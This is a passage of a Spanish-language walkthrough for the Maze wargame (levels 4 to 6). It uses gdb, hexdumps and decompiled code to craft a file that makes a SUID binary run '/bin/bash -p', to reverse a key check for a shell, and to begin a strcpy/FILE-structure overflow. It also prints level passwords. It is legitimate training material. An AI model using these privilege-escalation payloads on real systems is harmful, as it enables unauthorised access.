   0x080486c5 &lt;+202&gt;:   movzbl %dl,%edx
   0x080486c8 &lt;+205&gt;:   imul   %ecx,%edx
   0x080486cb &lt;+208&gt;:   cmp    %edx,%eax
   0x080486cd &lt;+210&gt;:   jne    0x80486fa &lt;main+255&gt;
   0x080486cf &lt;+212&gt;:   mov    -0x84(%ebp),%eax
   0x080486d5 &lt;+218&gt;:   cmp    $0x77,%eax
   0x080486d8 &lt;+221&gt;:   jg     0x80486fa &lt;main+255&gt;
   0x080486da &lt;+223&gt;:   push   $0x8048800
   0x080486df &lt;+228&gt;:   call   0x8048490 &lt;puts@plt&gt;
   0x080486e4 &lt;+233&gt;:   add    $0x4,%esp
   0x080486e7 &lt;+236&gt;:   mov    0xc(%ebp),%eax
   0x080486ea &lt;+239&gt;:   add    $0x4,%eax
   0x080486ed &lt;+242&gt;:   mov    (%eax),%eax
   0x080486ef &lt;+244&gt;:   push   $0x0
   0x080486f1 &lt;+246&gt;:   push   %eax
   0x080486f2 &lt;+247&gt;:   call   0x80484d0 &lt;execv@plt&gt;
   0x080486f7 &lt;+252&gt;:   add    $0x8,%esp
   0x080486fa &lt;+255&gt;:   mov    0x8049aa8,%eax
   0x080486ff &lt;+260&gt;:   push   %eax
   0x08048700 &lt;+261&gt;:   push   $0x12
   0x08048702 &lt;+263&gt;:   push   $0x1
   0x08048704 &lt;+265&gt;:   push   $0x8048816
   0x08048709 &lt;+270&gt;:   call   0x8048480 &lt;fwrite@plt&gt;
   0x0804870e &lt;+275&gt;:   add    $0x10,%esp
   0x08048711 &lt;+278&gt;:   pushl  -0x4(%ebp)
   0x08048714 &lt;+281&gt;:   call   0x80484e0 &lt;close@plt&gt;
   0x08048719 &lt;+286&gt;:   add    $0x4,%esp
   0x0804871c &lt;+289&gt;:   mov    $0x0,%eax
   0x08048721 &lt;+294&gt;:   leave
   0x08048722 &lt;+295&gt;:   ret
End of assembler dump.
(gdb) break *0x0804869e
Breakpoint 1 at 0x804869e: file maze4.c, line 50.
(gdb) x/16x $esp
0xffffd62c:     0x00000003     0x48484848     0x00000000     0x0000fb03  
0xffffd63c:     0x00000000     0x00000000     0x00000201     0x000081ed
0xffffd64c:     0x00000001     0x00003a9c     0x00000000     0x00000000
0xffffd65c:     0x00000000     0xffff0000     0x00000069     0x00001000
</code></pre></div><p>Observamos que el segundo argumento de <code>lseek</code> es <code>0x48484848</code> (<code>HHHH</code>). Esta función pondrá un puntero para leer el archivo en el carácter que está en la posición <code>0x48484848</code> (que es inválida, evidentemente). Una vez que el puntero está configurado, el programa leerá otra vez el archivo pero empezando desde la posición indicada por <code>lseek</code>.</p><p>La idea es llenar el archivo con datos cualesquiera hasta la posición donde tenemos ahora <code>HHHH</code>. Luego ponemos <code>0x20</code> para hacer que <code>lseek</code> ponga le puntero despues de <code>HHHH</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ python3 -c 'print("A" * 28 + "\x20\0\0\0" + "".join(chr(c) * 4 for c in range(0x41, 0x5b)))'
AAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ  
<span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ python3 -c 'print("A" * 28 + "\x20\0\0\0" + "".join(chr(c) * 4 for c in range(0x41, 0x5b)))' &lt; /tmp/file
<span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ xxd /tmp/file
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 2000 0000  AAAAAAAAAAAA ...
00000020: 4141 4141 4242 4242 4343 4343 4444 4444  AAAABBBBCCCCDDDD
00000030: 4545 4545 4646 4646 4747 4747 4848 4848  EEEEFFFFGGGGHHHH
00000040: 4949 4949 4a4a 4a4a 4b4b 4b4b 4c4c 4c4c  IIIIJJJJKKKKLLLL
00000050: 4d4d 4d4d 4e4e 4e4e 4f4f 4f4f 5050 5050  MMMMNNNNOOOOPPPP
00000060: 5151 5151 5252 5252 5353 5353 5454 5454  QQQQRRRRSSSSTTTT
00000070: 5555 5555 5656 5656 5757 5757 5858 5858  UUUUVVVVWWWWXXXX
00000080: 5959 5959 5a5a 5a5a 0a                   YYYYZZZZ.
</code></pre></div><p>Ahora, ponemos un <em>breakpoint</em> en las instrucciones de comparación (donde está el bloque <code>if</code> en el código fuente descompilado):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze4
Reading symbols from /maze/maze4...done.
(gdb) break *0x080486cb
Breakpoint 1 at 0x80486cb: file maze4.c, line 54.
(gdb) break *0x080486d5
Breakpoint 2 at 0x80486d5: file maze4.c, line 54.
(gdb) run /tmp/file
Starting program: /maze/maze4 /tmp/file

Breakpoint 1, 0x080486cb in main (argc=2, argv=0xffffd784) at maze4.c:54  
54      maze4.c: No such file or directory.
(gdb) x/i $eip
=&gt; 0x80486cb &lt;main+208&gt;:        cmp    %edx,%eax
(gdb) info registers
eax            0x44444444       1145324612
ecx            0x41     65
edx            0x1081   4225
ebx            0x0      0
esp            0xffffd638       0xffffd638
ebp            0xffffd6e8       0xffffd6e8
esi            0x2      2
edi            0xf7fc5000       -134459392
eip            0x80486cb        0x80486cb &lt;main+208&gt;
eflags         0x292    [ AF SF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
</code></pre></div><p>Aquí vemos que donde tenemos <code>0x44444444</code> (<code>DDDD</code>) el programa espera <code>0x1081</code>. Vamos a corregirlo desde GDB y continuamos:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) set $eax = 0x1081
(gdb) continue
Continuing.

Breakpoint 2, main (argc=2, argv=0xffffd784) at maze4.c:54  
54      in maze4.c
(gdb) x/i $eip
=&gt; 0x80486d5 &lt;main+218&gt;:        cmp    $0x77,%eax
(gdb) p/x $eax
$2 = 0x89
</code></pre></div><p>Esta vez, <code>0x89</code> es el tamaño del archivo. Por tanto, necesitamos un archivo cuyo tamaño sea <code>0x78</code> (aunque el archivo puede ser más pequeño). Después de estas comprobaciones, el archivo será ejecutado mediante <code>execve</code>.</p><p>Este es un archivo válido y que cumple todas las validaciones:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ python3 -c 'import os; os.write(1, b"A" * 28 + b"\x20\0\0\0" + b"B" * 12 + b"\x81\x10\0\0" + b"C" * 32 + b"\n")' &lt; /tmp/file  
<span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ xxd /tmp/file
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 2000 0000  AAAAAAAAAAAA ...
00000020: 4242 4242 4242 4242 4242 4242 8110 0000  BBBBBBBBBBBB....
00000030: 4343 4343 4343 4343 4343 4343 4343 4343  CCCCCCCCCCCCCCCC
00000040: 4343 4343 4343 4343 4343 4343 4343 4343  CCCCCCCCCCCCCCCC
00000050: 0a                                       .
</code></pre></div><p>Ahora necesitamos modificar los datos iniciales para que el archivo sea válido para ejecutarse también. Por ejemplo, podemos usar este:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ python3 -c 'import os; os.write(1, b"#!/bin/sh\n\n/bin/bash -p   # " + b"\x20\0\0\0" + b"B" * 12 + b"\xb8\x2e\0\0" + b"C" * 32 + b"\n")' &lt; /tmp/file  
<span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ xxd /tmp/file
00000000: 2321 2f62 696e 2f73 680a 0a2f 6269 6e2f  #!/bin/sh../bin/
00000010: 6261 7368 202d 7020 2020 2320 2000 0000  bash -p   #  ...
00000020: 4242 4242 4242 4242 4242 4242 b82e 0000  BBBBBBBBBBBB....
00000030: 4343 4343 4343 4343 4343 4343 4343 4343  CCCCCCCCCCCCCCCC
00000040: 4343 4343 4343 4343 4343 4343 4343 4343  CCCCCCCCCCCCCCCC
00000050: 0a                                       .
</code></pre></div><p>Básicamente, se trata de un <em>shell script</em> que utiliza un <em>shebang</em> para especificar que el archivo sea ehecutado con <code>/bin/sh</code>, luego utilizamos <code>/bin/bash -p</code> para que se utilice el privilegio SUID del binario. Nótese que <code>#</code> es un comentario en <em>shell scripting</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ cat /tmp/file
#!/bin/sh

/bin/bash -p   #  BBBBBBBBBBBB?.CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC  
</code></pre></div><p>Ahora lo ejecutamos y terminamos el nivel:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ /maze/maze4 /tmp/file  
valid file, executing
bash-4.4$ whoami
maze5
bash-4.4$ cat /etc/maze_pass/maze5
ishipaeroo
</code></pre></div><h2 id=nivel-5---6>Nivel 5 -> 6</h2><p>Para este nivel, tenemos un binario <code>/maze/maze5</code> que podemos descompilar con Ghidra y obtener la función <code>main</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">size_t</span> <span class=mtk1>sVar1;</span>
  <span class="mtk7 mtki">long</span> <span class=mtk1>lVar2;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar3;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>pass[</span><span class=mtk6>9</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>user[</span><span class=mtk6>9</span><span class=mtk1>];</span>

  <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"X----------------"</span><span class=mtk1>);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span> <span class=mtk4>Username:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%8s</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>user);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span>      <span class=mtk4>Key:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%8s</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>pass);</span>
  <span class=mtk1>sVar1</span> <span class=mtk5>=</span> <span class=mtk8>strlen</span><span class=mtk1>(user);</span>
  <span class=mtk5>if</span> <span class=mtk1>((sVar1</span> <span class=mtk5>==</span> <span class=mtk6>8</span><span class=mtk1>)</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>(sVar1</span> <span class=mtk5>=</span> <span class=mtk8>strlen</span><span class=mtk1>(pass),</span> <span class=mtk1>sVar1</span> <span class=mtk5>==</span> <span class=mtk6>8</span><span class=mtk1>))</span> <span class=mtk1>{</span>  
    <span class=mtk1>lVar2</span> <span class=mtk5>=</span> <span class=mtk8>ptrace</span><span class=mtk1>(PTRACE_TRACEME,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
    <span class=mtk5>if</span> <span class=mtk1>(lVar2</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
      <span class=mtk1>iVar3</span> <span class=mtk5>=</span> <span class=mtk8>foo</span><span class=mtk1>(user,</span> <span class=mtk1>pass);</span>
      <span class=mtk5>if</span> <span class=mtk1>(iVar3</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
        <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>\n</span><span class=mtk4>Nah,</span> <span class=mtk4>wrong."</span><span class=mtk1>);</span>
      <span class=mtk1>} </span><span class=mtk5>else</span> <span class=mtk1>{</span>
        <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>\n</span><span class=mtk4>Yeh,</span> <span class=mtk4>here</span><span class=mtk6>\'</span><span class=mtk4>s</span> <span class=mtk4>your</span> <span class=mtk4>shell"</span><span class=mtk1>);</span>
        <span class=mtk8>system</span><span class=mtk1>(</span><span class=mtk4>"/bin/sh"</span><span class=mtk1>);</span>
      <span class=mtk1>}</span>
    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>\n</span><span class=mtk4>nahnah..."</span><span class=mtk1>);</span>
    <span class=mtk1>}</span>
    <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
  <span class=mtk1>}</span>
  <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Wrong</span> <span class=mtk4>length</span> <span class=mtk4>you!"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
  <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
<span class=mtk1>}</span>
</code></pre></div><p>Básicamente, el programa pide un nombre y una contraseña, Además, no permite el uso de GDB, <code>strace</code> o <code>ltrace</code> porque <code>ptrace</code> no devolverá 0.</p><p>Después, el nombre de usuario y la contraseña son enviados a <code>foo</code> (solamente si los dos tienen una longitud de 8 bytes):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>foo</span><span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class="mtk9 mtki">s</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class="mtk9 mtki">a</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar1;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar2;</span>
  <span class="mtk7 mtki">size_t</span> <span class=mtk1>sVar3;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>cStack22;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>p[</span><span class=mtk6>9</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>x;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>i;</span>

  <span class=mtk1>p._0_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>6e697270</span><span class=mtk1>;</span>
  <span class=mtk1>p._4_4_</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>6c6f6c74</span><span class=mtk1>;</span>
  <span class=mtk1>p[</span><span class=mtk6>8</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>;</span>
  <span class=mtk5>for</span> <span class=mtk1>(i</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>sVar3</span> <span class=mtk5>=</span> <span class=mtk8>strlen</span><span class=mtk1>(s),</span> <span class=mtk1>(</span><span class="mtk7 mtki">uint</span><span class=mtk1>)i</span> <span class=mtk5>&lt;</span> <span class=mtk1>sVar3;</span> <span class=mtk1>i</span> <span class=mtk5>=</span> <span class=mtk1>i</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>  
    <span class=mtk1>p[i]</span> <span class=mtk5>=</span> <span class=mtk1>p[i]</span> <span class=mtk5>-</span> <span class=mtk1>(s[i]</span> <span class=mtk5>+</span> <span class=mtk5>-0x</span><span class=mtk6>41</span> <span class=mtk5>+</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span><span class=mtk1>)i</span> <span class=mtk5>*</span> <span class=mtk4>'</span><span class=mtk6>\x02</span><span class=mtk4>'</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk5>do</span> <span class=mtk1>{</span>
    <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk1>i</span> <span class=mtk5>+</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>;</span>
    <span class=mtk5>if</span> <span class=mtk1>(i</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
      <span class=mtk5>return</span> <span class=mtk6>1</span><span class=mtk1>;</span>
    <span class=mtk1>}</span>
    <span class=mtk1>iVar2</span> <span class=mtk5>=</span> <span class=mtk1>i</span> <span class=mtk5>+</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>;</span>
    <span class=mtk1>i</span> <span class=mtk5>=</span> <span class=mtk1>iVar1;</span>
  <span class=mtk1>}</span> <span class=mtk5>while</span> <span class=mtk1>(p[iVar2]</span> <span class=mtk5>==</span> <span class=mtk1>a[iVar1]);</span>
  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><p>El código descompilado es un poco extraño. El bucle <code>for</code> está realizando operaciones sobre el nombre de usuario con una clave que es <code>printlol</code> (<code>0x6e697270</code> y <code>0x6c6f6c74</code> pasados a formato bytes). Luego, el bucle <code>do</code>-<code>while</code> solamente verifica que la contraseña es igual al resultado de la operación anterior (carácter a carácter).</p><p>Por tanto, podemos reescribir este bucle <code>for</code> en otro archivo para obtener la contraseña esperada:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;stdlib.h&gt;</span>
<span class=mtk5>#include</span> <span class=mtk4>&lt;string.h&gt;</span>

<span class="mtk7 mtki">void</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span><span class=mtk5>**</span> <span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class=mtk5>if</span> <span class=mtk1>(argc</span> <span class=mtk5>!=</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk5>return</span><span class=mtk1>;</span>

  <span class="mtk7 mtki">int</span> <span class=mtk1>i;</span>
  <span class="mtk7 mtki">char</span><span class=mtk5>*</span> <span class=mtk1>key</span> <span class=mtk5>=</span> <span class=mtk4>"printlol"</span><span class=mtk1>;</span>
  <span class="mtk7 mtki">char</span><span class=mtk5>*</span> <span class=mtk1>username</span> <span class=mtk5>=</span> <span class=mtk1>argv[</span><span class=mtk6>1</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>password[</span><span class=mtk6>8</span><span class=mtk1>];</span>

  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Key:</span> <span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>key);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Username:</span> <span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>username);</span>

  <span class=mtk5>for</span> <span class=mtk1>(i</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>i</span> <span class=mtk5>&lt;</span> <span class=mtk6>8</span><span class=mtk1>;</span> <span class=mtk1>i</span><span class=mtk5>++</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk1>password[i]</span> <span class=mtk5>=</span> <span class=mtk1>key[i]</span> <span class=mtk5>-</span> <span class=mtk1>(username[i]</span> <span class=mtk5>-</span> <span class=mtk5>0x</span><span class=mtk6>41</span> <span class=mtk5>+</span> <span class=mtk1>i</span> <span class=mtk5>*</span> <span class=mtk6>2</span><span class=mtk1>);</span>  
  <span class=mtk1>}</span>

  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Expected</span> <span class=mtk4>password:</span> <span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>password);</span>
<span class=mtk1>}</span>
</code></pre></div><p>Ahora lo compilamos y ejecutamos pasándole un usuario como argumento:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gcc</span> -o password password.c  

<span class=code-cyan>$</span> <span class=code-dark-green>./password</span> AAAAAAAA
Key: printlol
Username: AAAAAAAA
Expected password: ppehlbc^
</code></pre></div><p>Y por tanto, podemos utilizar el programa para obtener una <em>shell</em> como <code>maze6</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze5@maze</span>:<span class=code-blue>~</span>$ /maze/maze5
X----------------
 Username: AAAAAAAA
      Key: ppehlbc^

Yeh, here's your shell
$ whoami
maze6
$ cat /etc/maze_pass/maze6  
epheghuoli
</code></pre></div><h2 id=nivel-6---7>Nivel 6 -> 7</h2><p>El código fuente descompilado de <code>/maze/maze6</code> se muestra a continuación:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>**</span><span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class=mtk1>FILE</span> <span class=mtk5>*</span><span class=mtk1>__stream;</span>
  <span class="mtk7 mtki">size_t</span> <span class=mtk1>__n;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>buf[</span><span class=mtk6>256</span><span class=mtk1>];</span>
  <span class=mtk1>FILE</span> <span class=mtk5>*</span><span class=mtk1>fp;</span>

  <span class=mtk5>if</span> <span class=mtk1>(argc</span> <span class=mtk5>!=</span> <span class=mtk6>3</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%s</span> <span class=mtk4>file2write2</span> <span class=mtk4>string</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>*</span><span class=mtk1>argv);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk1>__stream</span> <span class=mtk5>=</span> <span class=mtk8>fopen</span><span class=mtk1>(argv[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class=mtk4>"a"</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(__stream</span> <span class=mtk5>==</span> <span class=mtk1>(FILE</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>perror</span><span class=mtk1>(</span><span class=mtk4>"fopen"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk8>strcpy</span><span class=mtk1>(buf,</span> <span class=mtk1>argv[</span><span class=mtk6>2</span><span class=mtk1>]);</span>
  <span class=mtk1>__n</span> <span class=mtk5>=</span> <span class=mtk8>strlen</span><span class=mtk1>(buf);</span>
  <span class=mtk8>memfrob</span><span class=mtk1>(buf,</span> <span class=mtk1>__n);</span>
  <span class=mtk8>fprintf</span><span class=mtk1>(__stream,</span> <span class=mtk4>"</span><span class=mtk6>%s</span> <span class=mtk4>:</span> <span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>argv[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class=mtk1>buf);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
  <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
<span class=mtk1>}</span></span></code></pre></div><p>Primero, nos damos cuenta del uso de <code>strcpy</code>, que es vulnerable a <em>Buffer Overflow</em> ya que podemos controlar el contenido de la <em>string</em> de origen, que será copiada a la variable destino <code>buf</code>, que solamente tiene 256 bytes reservados.</p><p>Desafortunadamente, no existe instrucción de retorno que podamos sobrescribir, por lo que el <em>Buffer Overflow</em> no será útil para controlar la ejecución del programa.</p><p>Además, después de <code>strcpy</code>, los datos copiados en <code>buf</code> son modificados por <code>memfrob</code>. Esta función cifra cada byte utilizando una operación XOR con 42 (<code>0x2a</code>) como clave. Esto se debe tener en cuenta porque crearemos un <em>payload</em> y lo cifraremos con una clave 42 y XOR, de manera que <code>memfrob</code> revierte nuestro cifrado y copiamos los datos que queremos. Además, esta metodología nos permitirá enviar bytes nulos (si no, <code>strcpy</code> no funcionaría como esperamos porque los bytes nulos terminan las cadenas de caracteres en C).</p><p>Como no podemos sobrescribir la dirección de retorno, necesitamos modificar variables locales (que se almacenan en la pila). La única que importa es la que apunta a la estructura <code>FILE</code>, por lo que este es el camino.</p><p>Una búsqueda rápida en Internet nos muestra una técnica llamada <em>File Stream Oriented Programming</em> (FSOP), que consiste en falsificar una estructura <code>FILE</code> para conseguir una primitiva de escritura. Existe bastante información al respecto.</p><p>Primero de todo, ejecutemos el programa:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze6@maze</span>:<span class=code-blue>~</span>$ /maze/maze6
/maze/maze6 file2write2 string
<span class=code-green>maze6@maze</span>:<span class=code-blue>~</span>$ /maze/maze6 file.txt AAAA
fopen: Permission denied
<span class=code-green>maze6@maze</span>:<span class=code-blue>~</span>$ cd /tmp
<span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ echo AAAA > asdf.txt
<span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ /maze/maze6 asdf.txt AAAA
fopen: Permission denied
</code></pre></div><p>Este comportamiento es extraño. Parece que el programa no tiene los permisos suficientes para escribir datos en <code>asdf.txt</code>. Comprobemos los permisos:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ ls -l --time-style=+ asdf.txt
-rw-r--r-- 1 maze6 root 5  asdf.txt
</code></pre></div><p>Aquí está, como <code>/maze/maze6</code> es un binario SUID, se está ejecutando como usuario <code>maze7</code>, pero el archivo <code>asdf.txt</code> pertenece a <code>maze6</code> y otros solamente pueden leer. Por tanto, Tenemos que cambiar sus permisos para que sean al menos <code>rw</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ chmod 666 asdf.txt
<span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ ls -l --time-style=+ asdf.txt
-rw-rw-rw- 1 maze6 root 5  asdf.txt
<span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ /maze/maze6 asdf.txt AAAA
<span class=code-green>maze6@maze</span>:<span class=code-blue>/tmp</span>$ cat asdf.txt
AAAA
